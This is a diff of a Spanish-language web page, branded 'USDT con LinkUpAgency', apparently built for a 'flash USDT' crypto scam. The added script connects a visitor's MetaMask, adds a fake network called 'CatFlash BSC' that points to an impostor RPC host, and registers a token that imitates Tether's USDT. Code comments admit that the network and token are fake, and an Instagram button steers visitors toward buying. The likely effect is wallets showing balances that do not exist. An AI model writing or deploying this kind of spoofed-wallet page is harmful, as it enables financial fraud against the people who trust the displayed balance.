@@ -1,73 +1,111 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Demo USDT con Linkupagency</title>
+  <meta charset="UTF-8">
+  <title>USDT 💸 con LinkUpAgency</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #121212;
+      background-color: #0f0f0f;
       color: #fff;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 60px 20px;
     }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 40px;
+    }
+
     button {
       padding: 15px 30px;
       font-size: 18px;
       border: none;
-      border-radius: 10px;
-      background-color: #3b82f6;
-      color: white;
+      border-radius: 8px;
+      margin: 12px;
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
-    button:hover {
+
+    .connect {
+      background-color: #3b82f6;
+      color: white;
+    }
+
+    .connect:hover {
       background-color: #2563eb;
+    }
+
+    .contact {
+      background-color: #10b981;
+      color: white;
+    }
+
+    .contact:hover {
+      background-color: #059669;
     }
   </style>
 </head>
 <body>
 
-  <h1>Demo USDT Falso</h1>
-  <button id="connectButton">Connect MetaMask</button>
+  <h1>USDT 💸 con LinkUpAgency</h1>
+
+  <!-- Botón que ejecuta TODO como Catflash -->
+  <button class="connect" id="connectBtn">Conectar MetaMask</button>
+
+  <!-- Botón que lleva a Instagram -->
+  <button class="contact" onclick="window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank')">
+    Contactar o Comprar con LinkUp 🔗
+  </button>
 
   <script>
-    const connectButton = document.getElementById('connectButton');
+    const connectBtn = document.getElementById('connectBtn');
 
-    connectButton.addEventListener('click', async () => {
-      if (typeof window.ethereum !== 'undefined') {
-        try {
-          // Solicitar acceso a la wallet
-          await ethereum.request({ method: 'eth_requestAccounts' });
+    connectBtn.addEventListener('click', async () => {
+      if (typeof window.ethereum === 'undefined') {
+        alert('Por favor instala MetaMask para continuar.');
+        return;
+      }
 
-          // Añadir Binance Smart Chain a MetaMask
-          await ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: '0x38', // 56 en hexadecimal
-              chainName: 'Binance Smart Chain',
-              nativeCurrency: {
-                name: 'BNB',
-                symbol: 'BNB',
-                decimals: 18
-              },
-              rpcUrls: ['https://bsc-dataseed.binance.org/'],
-              blockExplorerUrls: ['https://bscscan.com/']
-            }]
-          });
+      try {
+        // Conectar la wallet
+        await ethereum.request({ method: 'eth_requestAccounts' });
 
-          alert('MetaMask conectada y red BSC configurada!');
-        } catch (error) {
-          console.error(error);
-          alert('Error al conectar MetaMask');
-        }
-      } else {
-        alert('Por favor instala MetaMask');
+        // Añadir la red falsa (como la de Catflash)
+        await ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: '0x53c',
+            chainName: 'CatFlash BSC',
+            rpcUrls: ['https://dataseed-binance.catflash.cat/'],
+            nativeCurrency: {
+              name: 'BNB',
+              symbol: 'BNB',
+              decimals: 18
+            },
+            blockExplorerUrls: ['https://bscscan.com']
+          }]
+        });
+
+        // Añadir token falso USDT (idéntico al real)
+        await ethereum.request({
+          method: 'wallet_watchAsset',
+          params: {
+            type: 'ERC20',
+            options: {
+              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // contrato real de USDT (Catflash usa ese clon)
+              symbol: 'USDT',
+              decimals: 6,
+              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+            }
+          }
+        });
+
+        alert('✅ MetaMask conectado y token USDT añadido.');
+      } catch (err) {
+        console.error(err);
+        alert('❌ Error al conectar MetaMask o añadir red/token.');
       }
     });
   </script>
